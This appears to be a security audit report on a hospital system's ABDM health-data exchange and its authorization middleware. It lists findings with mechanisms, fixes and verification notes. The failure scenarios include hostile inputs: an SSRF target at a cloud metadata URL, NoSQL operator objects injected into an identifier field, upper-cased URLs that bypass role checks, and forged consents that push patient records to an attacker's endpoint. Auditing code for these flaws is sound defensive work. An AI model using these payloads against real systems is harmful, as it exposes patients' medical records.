findings.verifyEvidence: I tried to refute this on four fronts and every one held up. 1. The cited asymmetry is real and verbatim. abdmDataFlowService.js:48 builds `notesFilter = { ...(currentAdmission ? { admissionId: currentAdmission._id } : { patientUHID: UH }), ...dateClause("visitDate") }` and line 61 does the same for DischargeSummary (`{ ...(currentAdmission ? { admissionId: currentAdmission._id } : { UHID: UH }), ...dateClause("createdAt") }`). But line 51 is `DoctorOrder.find({ UHID: UH, ...dateClause("orderedAt") }).limit(500)` and line 55 is `InvestigationOrder.find({ UHID: UH, ...dateClause("createdAt") }).limit(500)` — neither references `currentAdmission._id`. The `currentAdmission` variable is in scope (resolved at line 44-47) and used by its two neighbours, so this is an omission, not a design choice: the same function proves the intent to scope by encounter. 2. The "only remaining bound is dateRange, and it collapses to nothing" claim holds. `dateClause` (lines 37-42) returns `{}` unless `$gte` or `$lte` is set, and AbdmConsentArtefactModel.js:36 declares `dateRange: { from: { type: Date, default: null }, to: { type: Date, default: null } }` — both default null. Line 102 (`consentArtefact.permission.dateRange || null`) therefore yields an object whose from/to are null, so `dateClause` returns `{}` and the query degrades to a bare `{ UHID }` capped only by `.limit(500)`. An artefact with no dateRange is the schema default, not an exotic edge case. 3. Both models genuinely carry the f…

findings.title: Served care contexts are never bound to the consent's patient/HIU/HIP, and the CM signature is never verified
findings.mechanism: buildEncryptedTransfer resolves care contexts with `AbdmCareContext.find({ careContextReference: { $in: (consentArtefact.careContexts||[]).map(c => c.careContextReference) } })` (lines 96-98) — the lookup is keyed on the reference string ALONE, with no `abhaAddress`/`UHID`/`patientId` predicate tying the row to `consentArtefact.abhaAddress`. consentHipNotify stores whatever refs arrive (abdmController.js:104) with no membership check, stores `hipId: d.hip?.id || ABDM.hipId` without asserting `d.hip.id === ABDM.hipId` (line 101), and persists `signature: n.signature || ""` (line 111) which is never verified against the CM's JWKS anywhere in the codebase. healthInfoHipRequest then loads the artefact by consentId only and checks `artefact.isActive()` (line 141) — never that the requesting HIU matches `artefact.hiu.id`.
findings.failureScenario: A malformed or malicious consent notification arrives naming patient ram@sbx but listing careContexts:[{careContextReference:"CC-ADM7781"}] — an admission belonging to a different patient (sita@sbx). The artefact upserts cleanly. The HIU then issues health-information/hip/request with that consentId; isActive() passes; buildEncryptedTransfer finds CC-ADM7781 by reference, assembleFile runs on sita's UHID, and sita's full record is encrypted and pushed to an HIU that only ever held ram's consent. Nothing in the pipeline would reject it. The same absence of signature verification means the correctness of the whole M3 chain rests solely on the shared HMAC secret (see the sandbox-default finding).
findings.fixSketch: Query care contexts with the patient predicate: `AbdmCareContext.find({ careContextReference: {$in: refs}, abhaAddress: consentArtefact.abhaAddress })` and abort the transfer if `found.length !== refs.length`. In consentHipNotify reject notifications where `d.hip.id !== ABDM.hipId`, and verify `n.signature` (detached JWS) against the CM's JWKS before persisting status GRANTED. In healthInfoHipRequest assert the requester identity matches `artefact.hiu.id`.
findings.verifyEvidence: CORE CLAIM CONFIRMED VERBATIM. abdmDataFlowService.js:96-98 reads exactly: `const ccRows = careContexts || await AbdmCareContext.find({ careContextReference: { $in: (consentArtefact.careContexts || []).map((c) => c.careContextReference) } }).lean();` — keyed on the reference string alone, no abhaAddress/UHID/patientId predicate tying the row to consentArtefact.abhaAddress, and no length/membership assertion. The binding field EXISTS and IS POPULATED, so the omission is not a data-model limitation: AbdmCareContextModel.js:20 declares `abhaAddress: { type: String, trim: true, default: "", index: true }` (also indexed at line 53), and abdmLinkService.js:86 writes `abhaAddress: patient.abhaAddress, abhaNumber: patient.abhaNumber` at link time. ccRows flows unfiltered into the loop at line 104 -> buildBundleForCareContext(cc, hiType, dateRange) -> line 76 `assembleFile(careContext.UHID, careContext.admissionId, dateRange)`, i.e. assembly is driven by the ROW's own UHID, so a reference naming another patient's encounter assembles and encrypts that patient's record. Nothing between artefact load and abdmCrypto.encrypt (line 110) compares cc.abhaAddress to consentArtefact.abhaAddress. SIGNATURE CLAIM CONFIRMED. abdmController.js:111 persists `signature: n.signature || "", status: "GRANTED"`; AbdmConsentArtefactModel.js:41-42 comments it "kept for audit / non-repudiation" only. A repo-wide grep over Backend for `jwks|JWKS|verifySignature|detached|jose|createVerify` yields ZERO verifi…

findings.title: Consent never expires when the CM omits dataEraseAt — isActive() fails open, and dateRange/accessMode are not checked
findings.mechanism: consentHipNotify sets `expiry: d.permission?.dataEraseAt || null` (abdmController.js:112). isActive() is `this.status === "GRANTED" && (!this.expiry || this.expiry > now)` (model lines 63-65) — a null expiry short-circuits to TRUE, so any artefact whose notification lacked permission.dataEraseAt authorises pulls forever. isActive() also ignores `permission.dateRange.to` (the ABDM consent validity window) and `permission.accessMode`, and it is the ONLY gate healthInfoHipRequest applies (abdmController.js:141).
findings.failureScenario: A CM (or a milestone-version payload shape where the erase timestamp lives under a different key) sends a consent notification without permission.dataEraseAt. The artefact stores expiry:null. Two years later, long after the consent's dateRange.to has passed and the patient believes the grant lapsed, the HIU replays health-information/hip/request with the same consentId — isActive() returns true and the HIP encrypts and pushes the patient's records again.
findings.fixSketch: Fail closed: default expiry to `d.permission?.dataEraseAt || d.permission?.dateRange?.to` and reject the notification when neither is present. Change isActive() to require a non-null expiry (`return this.status === 'GRANTED' && !!this.expiry && this.expiry > now`) and additionally reject when `permission.dateRange.to < now`.
findings.verifyEvidence: All cited lines verified verbatim. (1) AbdmConsentArtefactModel.js:63-65 is exactly `return this.status === "GRANTED" && (!this.expiry || this.expiry > now);` — the `!this.expiry` disjunct short-circuits TRUE on null. `expiry` is schema-defaulted to null (line 46), so fail-open is the default state, not an edge case. (2) abdmController.js:112 is exactly `expiry: d.permission?.dataEraseAt || null` with no fallback to `permission.dateRange.to` and no rejection when both are absent; the artefact is still written with `status: "GRANTED"` (line 111), yielding a permanently-active artefact. (3) abdmController.js:141 `if (!artefact || !artefact.isActive())` is confirmed as the ONLY authorization gate on the HI-request path; pushHealthInformation (abdmDataFlowService.js:140-189) applies no independent expiry or dateRange.to check. (4) No expiry sweeper exists — grep shows only 3 files reference AbdmConsentArtefact (model, controller, dataFlowService); no cron/job transitions a stale GRANTED artefact to EXPIRED. The only path to EXPIRED is the CM explicitly sending it (abdmController.js:116-117), so the HIP has zero autonomous expiry. CORRECTIONS TO THE FINDING (impact narrower than claimed, hence medium not higher): - The `accessMode` sub-claim is weak and should be dropped: accessMode (VIEW vs STORE) governs HIU-side retention semantics, not HIP disclosure — the HIP pushes the bundle either way, so ignoring it at line 141 is not a meaningful gate omission. - Leaked data IS bounded…

findings.title: SSRF: the HIU-supplied dataPushUrl is fetched with no scheme/host validation
findings.mechanism: healthInfoHipRequest takes `hiRequest.dataPushUrl` straight off the inbound callback body (abdmController.js:147), pushHealthInformation only checks it is non-empty (abdmDataFlowService.js:162-163), and hiDataPush() passes it verbatim to `fetch(dataPushUrl, {method:'POST', ...})` (abdmGateway.js:99-103). There is no protocol allowlist, no host allowlist against the registered HIU/CM domains, no private-IP/link-local block, and _fetch (lines 114-122) follows redirects by default.
findings.failureScenario: An HI request arrives with dataPushUrl = "http://169.254.169.254/latest/meta-data/" or "http://127.0.0.1:5000/api/internal/...". The HIP's server-side fetch issues a POST from inside the deployment's network perimeter; response status and body are journalled into abdm_transactions (lines 105-109), readable by any abdm.read user via GET /api/abdm/transactions. Pointing it at an attacker-controlled https host instead delivers the full encrypted PHI transfer to a destination that was never the consented HIU.
findings.fixSketch: Validate before fetching: require `https:` (allow http only in sandbox), resolve the hostname and reject private/loopback/link-local ranges, match the host against an allowlist derived from the registered CM/HIU bridge domains, and set `redirect: 'error'` on the fetch.
findings.verifyEvidence: MECHANISM CONFIRMED VERBATIM. abdmGateway.js:97-103 — hiDataPush(dataPushUrl, payload) calls _fetch(dataPushUrl, {method:"POST", headers, body}) with no scheme allowlist, no host allowlist, no private/loopback/link-local block. _fetch (114-122) adds only an AbortController timeout, spreads opts, and never sets redirect:"error" (Node default "follow"), so redirects ARE followed as claimed. abdmDataFlowService.js:162-163 only checks truthiness. abdmController.js:147 passes hiRequest.dataPushUrl straight off the inbound callback body. A Grep for dataPushUrl/allowlist/169.254 across Backend/ returns zero validation code anywhere — only these lines plus scripts/_abdm_milestone_dryrun.js:150. BUT TWO KEY IMPACT CLAIMS ARE REFUTED BY THE CODE: (1) "response status and body are journalled into abdm_transactions (105-109), readable by any abdm.read user" is FALSE. The _journal call at abdmGateway.js:105-109 stores only {kind, direction, status, endpoint, httpStatus, transactionId, error} — there is NO responsePayload field, unlike gwPost at line 83 which does journal `responsePayload: body`. The body read at line 104 is returned to pushHealthInformation, which discards it (line 188 returns only {pushed, httpStatus, entryCount}). So the http://169.254.169.254/latest/meta-data/ credential-theft scenario does NOT work — there is no response-body read channel. (2) "delivers the full encrypted PHI transfer to a destination that was never the consented HIU" is heavily weakened. abdmControl…

findings.title: NoSQL operator injection in discovery identifier matching + hardcoded matchedBy
findings.mechanism: `byType()` (line 108) returns the raw JSON `value` from the callback body without coercion, and `abhaAddr` (line 110, also fed by `identifiers.id`) is passed straight into `Patient.findOne({ abhaAddress: abhaAddr })` (line 114). Because Patient.abhaAddress is a String path (patientModel.js:55), Mongoose happily accepts and casts a query-operator object — `{abhaAddress: {$gt: ""}}` is a valid query, not a cast error. Note line 115 correctly wraps mobile in String(...) but line 114 does not. Separately, abdmController.js:46 hardcodes `matchedBy: ["MOBILE","ABHA_ADDRESS"]` regardless of which predicate actually matched — so a name+yearOfBirth match is reported to the CM as an ABHA/mobile match.
findings.failureScenario: A discovery callback with body patient.verifiedIdentifiers = [{"type":"ABHA_ADDRESS","value":{"$gt":""}}] makes findOne return the first patient in the collection with any non-empty abhaAddress. discoverForDemographics reports matched:true, and onDiscover ships that unrelated patient's fullName plus their complete care-context list (each display string carrying encounter type and visit date) to the requesting CM/HIU. `{"$ne":null}` on identifiers.id behaves the same. The bogus matchedBy then tells the CM this was a verified ABHA match.
findings.fixSketch: Coerce every identifier before querying: `const abhaAddr = String(byType('ABHA_ADDRESS') || identifiers.id || '')` and reject non-string identifier values outright. Also guard `abhaAddr !== ''` explicitly and set matchedBy from the predicate that actually fired.
findings.verifyEvidence: MECHANISM CONFIRMED, EXACTLY AS DESCRIBED. abdmLinkService.js:108 `const byType = (t) => all.find((i) => String(i.type||"").toUpperCase() === t)?.value;` returns the raw JSON value with no coercion. Line 110 `const abhaAddr = byType("ABHA_ADDRESS") || identifiers.id || "";` — an object operand is truthy so it passes the guard. Line 114 `if (abhaAddr) patient = await Patient.findOne({ abhaAddress: abhaAddr }).lean();` has no String() wrap, while line 115 DOES coerce mobile (`String(mobile).replace(/^\+?91/, "")`) — the asymmetry the finding cites is real. patientModel.js:55 `abhaAddress: { type: String, default: "", trim: true, index: true }` is a String path, so Mongoose castForQuery accepts `{$gt: ""}` as an operator object rather than throwing a CastError. Grep for sanitizeFilter|mongoSanitize|strictQuery across Backend (excl. node_modules) returns ZERO hits — no global filter sanitizer neutralizes $-keys. No validation layer sits between body and query: abdmController.js:41 passes `b.patient || {}` straight into discoverForDemographics. Hardcoded matchedBy confirmed at abdmController.js:46 `careContexts: result.careContexts, matchedBy: ["MOBILE", "ABHA_ADDRESS"]` — emitted literally even when the name+yearOfBirth branch (abdmLinkService.js:116-123) fired. WHY DOWNGRADED FROM MEDIUM TO LOW — the finding's failure scenario omits the guards gating the path. routes/ABDM/abdmCallbackRoutes.js:21 `router.use(requireAbdmEnabled, abdmSignature);` precedes the discover route at :2…

findings.dimension: AuthN / AuthZ / RBAC / tokens / rate limiting
findings.title: Express case-insensitive routing defeats the case-sensitive URL-regex authZ walls (Doctor/Nurse money-write block + discharged-record seal)
findings.line: 429-468 (blockNonClinicalForDoctorNurse; regexes 430-448, match at 455-457) and 691-812 (enforceActivePatientForClinicalWrites; rule match at 810-812)
findings.mechanism: Both walls are deny-on-match: they lowercase nothing and test hand-written case-sensitive regexes (e.g. `/\/billing\/[^?]*\/payment(\/|$)/`, `/\/cashier-sessions(\/|$)/`, `/\/doctor-notes(\/|$|\?)/`) against `req.originalUrl.split("?")[0]`. Express 5 (package.json:20) is mounted in Backend/index.js with no `app.set("case sensitive routing", true)` — grep for `caseSensitive`/`case sensitive` across Backend returns zero hits — so path-to-regexp matches routes with `sensitive:false` and `/api/BILLING/<id>/PAYMENT` dispatches to the same handler as `/api/billing/<id>/payment`. The regexes do not match the upper-cased URL, so the middleware calls `next()` and the wall is skipped. The route-level gate behind the wall does not compensate: `POST /:billId/payment` (routes/Billing/billingRoutes.js:168), `POST /advance` (:240), `POST /advance/:advanceId/apply` (:245), `POST /uhid/:UHID/collect-all` (:112) and `POST /cashier-sessions/open` (routes/Billing/cashierSessionRoutes.js:10) are all gated on `requireAction("billing.write")`, and `billing.write` explicitly includes Doctor and Nurse (config/permissions.js:251). The comment at permissions.js:243-250 states this is SAFE *because* blockNonClinicalForDoctorNurse blocks every money POST — that is precisely the control being bypassed. controllers/Billing/billingController.js:493-519 (recordPayment) does no role check of its own.
findings.failureScenario: A logged-in Doctor (or Nurse) sends `POST /api/billing/<billId>/PAYMENT` with `{amount: 50000, paymentMode: "CASH"}` and their normal Bearer token. authenticate passes; blockNonClinicalForDoctorNurse sees url `/api/billing/<billId>/PAYMENT`, none of its 13 lower-case regexes match, so it calls next(); billingRoutes matches the route case-insensitively; requireAction("billing.write") allows Doctor; recordPayment writes a ₹50,000 CASH receipt stamped `receivedByRole: "Doctor"`, mutates the bill balance and the cashier day-book — a separation-of-duties control the codebase documents as enforced. The same trick opens `/api/CASHIER-SESSIONS/open` (Doctor opens a cash drawer) and `/api/ADVANCE`-style paths. Identically, `POST /api/DOCTOR-NOTES` with `admissionId` of a **Discharged** admission skips enforceActivePatientForClinicalWrites entirely (rule lookup at auth.js:810 finds no rule for the upper-cased url), silently writing into a NABH MOI.1-sealed record without the audited X-Late-Entry reason path (auth.js:889-910).
findings.fixSketch: Normalize once before matching: `const url = req.originalUrl.split("?")[0].toLowerCase();` in blockNonClinicalForDoctorNurse (auth.js:455), enforceActivePatientForClinicalWrites (auth.js:807) and the resolvers that regex `req.path`, and/or set `app.set("case sensitive routing", true)` in Backend/index.js so the router itself refuses the upper-cased path. Belt-and-braces: add a role check inside recordPayment/openSession, or split a `billing.payment` action that excludes Doctor/Nurse rather than relying on a URL wall.
findings.verifyEvidence: CONFIRMED — mechanism verified in code AND reproduced empirically against the project's own Express install. 1) CASE-SENSITIVE MATCHING (as claimed). Backend/middleware/auth.js:455 `const url = req.originalUrl.split("?")[0];` — no normalization — then loops the 13 lowercase regexes at :432-448 (e.g. :432 `/\/billing\/[^?]*\/payment(\/|$)/`, :443 `/\/cashier-sessions(\/|$)/`, :439 `/\/billing\/advance(\/|$)/`). Deny-on-match: `return next()` at :467 when nothing matches. enforceActivePatientForClinicalWrites is identical: :807 same un-lowercased url, :810-812 `ENFORCE_DISCHARGE_WRITE_RULES.find(r => r.method === req.method && r.regex.test(url))`, :813 `if (!rule) return next();` — rules at :696-702 (`/\/doctor-notes(\/|$|\?)/` etc.) are all lowercase. 2) EXPRESS IS CASE-INSENSITIVE (as claimed). Installed express 5.1.0 (package.json dep ^5.1.0; `require('express/package.json').version` = 5.1.0). Grep `case.?[Ss]ensitive` across Backend returns only 3 unrelated comments (services/Compliance/nabhRegisterEmitter.js:651, services/Clinical/medicationSafety.js:26, scripts/normalize-billing-paths.js:3) — no `app.set("case sensitive routing", true)`. Backend/index.js:97 sets only `app.set("trust proxy", 1)`. Mount chain: index.js:1396 `app.use("/api", require("./routes/index"))`; routes/index.js:126 authenticate → :153 blockNonClinicalForDoctorNurse → :160 enforceActivePatientForClinicalWrites → feature routers. 3) EMPIRICAL PROOF. Built a probe using D:/Spherehealth/Backend/node_mod…

findings.dimension: AuthN / AuthZ / RBAC / tokens / rate limiting
findings.title: 60s user-status LRU is never invalidated on tokenVersion bump — every password change 401s the user with TOKEN_STALE for up to a minute
findings.mechanism: authenticate() caches `{isActive,status,tokenVersion,mustChangePassword,...}` per user id in `_userStatusCache` with `ttlMs: 60_000` (auth.js:80) and rejects any request whose `decoded.tokenVersion !== u.tokenVersion` (auth.js:103). `POST /api/auth/change-password` bumps `user.tokenVersion = (user.tokenVersion||0)+1` (authRoutes.js:358), saves, and re-mints a JWT carrying the NEW tokenVersion (authRoutes.js:382) explicitly so "the caller's current session doesn't auto-eject". But that same request already populated the cache with the OLD tokenVersion during its own authenticate() pass, and nothing invalidates it — grep across Backend shows `_userStatusCache` is only referenced at auth.js:13/79/80/82, with no `.invalidate()`/`.clear()` call anywhere (utils/lruCache.js:58-64 exposes both). The cache also holds the stale `mustChangePassword: true`, which requirePasswordRotated (auth.js:292-303) turns into a 403 on every write.
findings.failureScenario: Admin creates a new Nurse. `mustChangePassword` defaults to true (models/User/userModel.js:68), so on first login she is forced into the rotation modal. She POSTs /api/auth/change-password with a valid new password → 200, tokenVersion goes 0→1, frontend stores the returned token (tokenVersion:1). Her very next request (e.g. GET /api/admissions) hits authenticate: the 60s-TTL cache still returns tokenVersion 0, `1 !== 0` → 401 `{code:"TOKEN_STALE"}`. TOKEN_STALE is a HARD_LOGOUT code, so she is bounced to the login screen. She logs back in (login bypasses the cache and mints tokenVersion:1), and the next authenticated request 401s again for the remainder of the 60s window — an unbootable loop for up to a minute after every password change, on the mandatory first-login path for every new hire. Same for POST /auth/logout-all-devices (authRoutes.js:540) and admin reset-password.
findings.fixSketch: Export an `invalidateUserStatus(userId)` from middleware/auth.js that calls `_userStatusCache.invalidate(String(userId))`, and call it from change-password (authRoutes.js after `user.save()`), logout-all-devices, userService.adminResetPassword, terminateUser, and the role-change bump in controllers/User/userController.js:143. Cheap alternative: treat `decoded.tokenVersion > u.tokenVersion` as a cache-miss and re-read from Mongo before rejecting.
findings.verifyEvidence: Every link verified in actual code; could not refute. 1) auth.js:79-82 — `_userStatusCache = require("../utils/lruCache")({ max: 500, ttlMs: 60_000 })`, read-through keyed on String(decoded.id), caching {isActive,status,tokenVersion,mustChangePassword,...}. auth.js:103 — `if ((decoded.tokenVersion || 0) !== (u.tokenVersion || 0)) return res.status(401).json({code:"TOKEN_STALE"})`. STRICT INEQUALITY, not `<`: a token NEWER than the cached row is rejected identically to a stale one. This is the crux — the "60s eventual consistency" design (documented auth.js:10-12) only reasoned about tokens older than the DB, never newer. 2) No invalidation anywhere. Grep over all of Backend/ for `_userStatusCache` returns ONLY auth.js:13/79/80/82. utils/lruCache.js:58-64 DOES expose `invalidate(key)` and `clear()`, and sibling caches call them (billingController.js:475/524/2547, dashboardsController.js:73/85/86) — the user-status cache never does. Nothing is exported from auth.js to permit it. 3) The route poisons its own cache: authRoutes.js:316 `router.post("/change-password", authenticate, ...)` — authenticate runs and caches tokenVersion N BEFORE line 358 `user.tokenVersion = (user.tokenVersion||0)+1`, line 359 `await user.save()`, and lines 376-391 re-mint a JWT with `tokenVersion: user.tokenVersion` (N+1) explicitly so "the caller's current session doesn't auto-eject". It ejects anyway. 4) Impact confirmed: userModel.js:68 `mustChangePassword: { type: Boolean, default: true }` → mandat…

findings.dimension: AuthN / AuthZ / RBAC / tokens / rate limiting
findings.title: restrictToOwnNurseWard attaches req.scopeFilter that no admission controller ever reads — nurse ward scoping on /api/admissions is dead code
findings.mechanism: restrictToOwnNurseWard sets `req.nurseWard` and `req.scopeFilter = { "bed.ward": req.user.ward }` and relies on "downstream controllers to merge into their Mongo query" (auth.js:325-331, 353-360). admissionRoutes.js:20 mounts it on the whole router. But grep for `scopeFilter`/`nurseWard` across Backend shows the only consumers are controllers/Pharmacy/pharmacyController.js (1651, 1840, 2023, 2229, 2349) and controllers/MLC/mlcController.js:19 — controllers/Patient/admissionController.js never references `req.scopeFilter` or `req.nurseWard` (it does its own Doctor scoping via `req.doctorProfile` at lines 70, 114, 128, 736, making restrictToOwnDoctorPatients redundant there, but there is no equivalent nurse branch). The middleware therefore runs, allocates the filter object, and the controller ignores it.
findings.failureScenario: A Nurse assigned to Ward A (User.ward = <wardA>) calls `GET /api/admissions` or `/api/admissions/search?q=`. authenticate populates req.user.ward from a fresh DB read (auth.js:108/154); restrictToOwnNurseWard sets `req.scopeFilter={"bed.ward":<wardA>}`; admissionController's list handler builds its filters without consulting it and `ipd.read` (permissions.js:399) permits Nurse — so she receives every active admission hospital-wide, including ICU/private-ward patients she has no care relationship with (name, UHID, diagnosis, attending doctor). The stated D9-CRIT control is silently absent; nothing in the request path fails, so no test catches it.
findings.fixSketch: Either merge `req.scopeFilter` into the query inside admissionController's list/search/dashboard handlers (mirroring pharmacyController.js:1651-1660 which maps `bed.ward` → the admission's ward field), or drop the middleware from admissionRoutes.js:20 and stop advertising the scope. Confirm the field name too — the filter key is `"bed.ward"` while pharmacyController translates it to `wardName`, so a naive Object.assign into an Admission query may match nothing and silently fail closed instead of open.
findings.verifyEvidence: All claims verified against actual code; could not refute. 1) MIDDLEWARE EXISTS AS DESCRIBED — Backend/middleware/auth.js:361-369:    const restrictToOwnNurseWard = (req, _res, next) => {      if (req.user?.role === "Nurse" && req.user?.ward) {        req.nurseWard = req.user.ward;        req.scopeFilter = Object.assign({}, req.scopeFilter, { "bed.ward": req.user.ward });      }      return next();    };    Doc comment auth.js:353-360 advertises it as "R7az-A/D9-CRIT: nurse list-endpoint scope ... for downstream controllers that page through admissions". 2) MOUNTED — Backend/routes/Patient/admissionRoutes.js:20:    router.use(attemptAuth, attachDoctorProfile, restrictToOwnDoctorPatients, restrictToOwnNurseWard); 3) NO ADMISSION CONSUMER — repo-wide grep for `scopeFilter|nurseWard` across Backend returns hits ONLY in: middleware/auth.js (326,338,355,363,364), controllers/Pharmacy/pharmacyController.js (1646-1659, 1839-1841, 2023-2030, 2228-2233, 2349-2357), controllers/MLC/mlcController.js:19, and comments in routes/Patient/admissionRoutes.js:17 + routes/Pharmacy/pharmacyRoutes.js:9. controllers/Patient/admissionController.js has ZERO matches for scopeFilter/nurseWard/req.user.ward — its only `ward` hits are a comment (L1157) and a write-path bed snapshot (L1475: `ward: bedSnapshot.wardName || ""`). 4) EVERY LIST HANDLER HAS A DOCTOR BRANCH AND NO NURSE BRANCH — admissionController.js: getAllAdmissions (67-75, only `if (req.user?.role === "Doctor" && req.doctorProfile?._id) f…

findings.dimension: AuthN / AuthZ / RBAC / tokens / rate limiting
findings.title: Per-action 2FA OTP is generated with Math.random() and verify has no per-token attempt counter
findings.mechanism: `const otp = String(Math.floor(100_000 + Math.random() * 900_000));` uses V8's non-cryptographic xorshift128+ PRNG even though `crypto` is already imported at line 28 and is used two lines later for the token (line 77). Math.random's internal state is recoverable from a modest number of observed outputs, and every OTP leaks ~20 bits of it. Separately, verifyOtp (115-128) marks `row.used = true` only on success — a wrong OTP leaves the row live for the full 5-minute OTP_TTL_MS with no failure counter and no lockout, so the only brute-force bound is the IP bucket `app.use("/api/2fa", otpLimiter)` in Backend/index.js:174 (5 requests / 15 min / IP). That single bucket also counts /request and /verify together, so an attacker on a second IP (or the hospital's own NATted LAN, where `app.set("trust proxy", 1)` means every workstation shares one req.ip bucket) gets 5 guesses per window while legitimate users are throttled by the attacker's traffic. These OTPs gate sign-dnr / sign-death / controlled-rx / blood-tx (line 60).
findings.failureScenario: A Nurse with `auth.2fa` (permissions.js:483) legitimately requests OTPs for blood-tx confirmations over a shift, recording each 6-digit value she receives on her own phone. Those samples let her solve for the Math.random state and predict the next OTPs the process will emit. She then triggers a `controlled-rx` OTP request against a Doctor's session flow, predicts the OTP the Doctor's phone received without ever seeing it, and mints a nonce — the nonce actor-binding at line 161 only checks the nonce belongs to whoever requested it, so she completes a Schedule-X narcotic order under her own 2FA attestation without the second factor ever leaving her control. Lower-effort variant: with the failure counter absent, any 5 guesses/window against a known token cost nothing and never invalidate the OTP.
findings.fixSketch: Replace line 76 with `crypto.randomInt(100000, 1000000)`. Add `row.attempts = (row.attempts||0)+1` in verifyOtp and delete the row at 5 failures. Add a dedicated tighter limiter for /2fa/verify keyed on `token` (not IP) so shared-NAT hospital LANs don't collapse into one bucket.
findings.verifyEvidence: The two mechanical defects are REAL and cited accurately. twoFactorController.js:76 is verbatim `const otp = String(Math.floor(100_000 + Math.random() * 900_000));` while `crypto` is imported at line 28 and used at line 77 for the token — genuine CWE-338. verifyOtp confirms no attempt counter: `row.used = true` is at line 129, AFTER the failure returns at 126/127/128, so a wrong OTP leaves the row live for the full OTP_TTL_MS. index.js:174 `app.use("/api/2fa", otpLimiter)` with max:5/15min keyed on IP covering /request+/verify together, permissions.js:483 `"auth.2fa": ["Admin","Doctor","Nurse"]`, and index.js:97 `app.set("trust proxy", 1)` all confirmed. However the IMPACT claims are refuted on three counts: (1) THE STATED GATE DOES NOT EXIST. The finding claims these OTPs "gate sign-dnr / sign-death / controlled-rx / blood-tx (line 60)". Line 60 is only an input-validation allowlist of `purpose` strings. The enforcement middleware `exports.requireTwoFactor` (line 145) is exported but MOUNTED NOWHERE. Repo-wide grep for `requireTwoFactor`, `twoFactorController`, and `x-2fa-nonce` (case-insensitive, across Backend and Frontend) returns only: the definition at twoFactorController.js:145, routes/Clinical/twoFactorRoutes.js:13 (which mounts ONLY `/request` and `/verify`), auth.js:152 (a comment), and doc/audit markdown. No clinical endpoint consumes a nonce; the Frontend never sends the X-2FA-Nonce header. Forging or brute-forcing an OTP unlocks no privileged operation. (2) THE…

findings.dimension: AuthN / AuthZ / RBAC / tokens / rate limiting
findings.title: permissions.js grants four actions to a role "HR" that does not exist in the User.role enum
findings.mechanism: `"hr.training.write": ["Admin", "HR"]`, `"hr.training.read": ["Admin", "HR", "Doctor", "Nurse"]`, `"hr.roster.read": ["Admin", "HR", "Doctor", "Nurse"]` and `"hr.roster.write": ["Admin", "HR"]` reference role `"HR"`. models/User/userModel.js:105-128 pins `role` to a 15-value enum (Doctor, Nurse, Admin, Receptionist, Pharmacist, Lab Technician, Radiologist, Physiotherapist, Ward Boy, Accountant, Security, Housekeeping, Dietician, TPA Coordinator, MRD) — `HR` is not among them, so `User.create({role:"HR"})` fails schema validation and `roleCan("HR", ...)` (permissions.js:732-738) can never be reached with a real token. The file's own header documents exactly this class of bug for `Maintenance` (lines 31-36) and warns at runtime for Radiologist/Physiotherapist (`_maybeWarn`, 717-730), but HR was added later without the same audit and gets no warning.
findings.failureScenario: An admin tries to delegate the NABH HRM.1 duty roster (routes mounted at routes/index.js:193) or HRM.4/5 training records (:413) to a dedicated HR staffer. Creating the user with role "HR" 500s on a Mongoose ValidationError; picking any real role (e.g. Receptionist) yields 403 on every `hr.roster.write` / `hr.training.write` call. The roster and training registers are therefore permanently Admin-only, and the permissions matrix misleads the next auditor into believing an HR tier is provisioned.
findings.fixSketch: Either add "HR" to the User.role enum (userModel.js:108-127) and to the frontend ROLES catalogue, or strip "HR" from the four ACTIONS entries and note the decision in the header's phantom-role log alongside Maintenance. At minimum extend `_maybeWarn` to cover any role in ACTIONS that is absent from the User enum, so this can't regress silently again.
findings.verifyEvidence: CONFIRMED at low. All cited code verified verbatim. 1) Grants exist as claimed — Backend/config/permissions.js:562-563 ("hr.training.write": ["Admin","HR"], "hr.training.read": ["Admin","HR","Doctor","Nurse"]) and :590-591 ("hr.roster.read": ["Admin","HR","Doctor","Nurse"], "hr.roster.write": ["Admin","HR"]). Frontend/src/config/permissions.js:383-384,402-403 mirror them identically. 2) "HR" is not a role — models/User/userModel.js:105-128 pins role to exactly the 15 enum values the finding lists (Doctor, Nurse, Admin, Receptionist, Pharmacist, Lab Technician, Radiologist, Physiotherapist, Ward Boy, Accountant, Security, Housekeeping, Dietician, TPA Coordinator, MRD); HR absent. Frontend/src/config/permissions.js:33-53 ROLES catalogue also has no HR key, so the admin user-create UI cannot offer it. 3) Refutation attempt (validator bypass) FAILED — both write paths enforce the enum: services/User/userService.js:39 `User.create(userData)` (validated) and :206-209 `User.findByIdAndUpdate(id, updateData, { new: true, runValidators: true })`. middleware/auth.js:90,146 sources role from the JWT and re-verifies against the DB row (60s TTL re-check), so no forged/mass-assigned role reaches roleCan. Therefore roleCan("HR", ...) at permissions.js:732-738 is genuinely unreachable and the four grants are dead config. 4) Refutation attempt (intentional forward-provisioning) FAILED — the file contradicts itself. permissions.js:522 states `no dedicated "HR" / "Charge Nurse" / "Safety Offic…

findings.dimension: Data security — PHI exposure, injection, upload, IDOR/BOLA
findings.title: ABDM callback surface is unauthenticated whenever ABDM_ENV != "prod": attacker can forge a GRANTED consent artefact and have the HIS push a patient's full FHIR chart to a URL of their choosing
findings.mechanism: routes/index.js:123 mounts /api/abdm/v0.5 ABOVE the global `authenticate` wall; the only guard is abdmSignature. abdmSignature.js:38-44 says: if `ABDM.callbackHmacSecret` is empty AND `ABDM.env !== "prod"` → `console.warn` + `next()` (allow). config/abdm.js:27 defaults ENV to "sandbox" for ANY value of ABDM_ENV other than the literal "prod". So a deployment with `ABDM_ENABLED=1` and a missing/typo'd `ABDM_ENV` (or a pilot deliberately on sandbox) exposes all five callbacks to anonymous internet traffic. abdmController.js:97-115 then `findOneAndUpdate(..., {upsert:true})` a consent artefact using ONLY body-supplied values: `consentId`, `careContexts`, `hiTypes`, `status:"GRANTED"`, and `expiry: d.permission?.dataEraseAt || null` (null ⇒ AbdmConsentArtefactModel.js:63-65 `isActive()` returns true forever). The `signature` field (the CM's non-repudiation blob) is stored at abdmController.js:111 but grep across Backend/services/Abdm shows it is NEVER verified anywhere. healthInfoHipRequest (abdmController.js:139-148) then looks the artefact up by the attacker's own `consentId`, passes `isActive()`, and calls `dataFlow().pushHealthInformation` with `keyMaterial` and `dataPushUrl` taken verbatim from the same attacker body. buildEncryptedTransfer (abdmDataFlowService.js:87-124) encrypts each care context's FHIR bundle to `hiuKey.dhPublicKey.keyValue` — the ATTACKER's public key — and abdmGateway.js:97-111 POSTs it to the attacker's dataPushUrl.
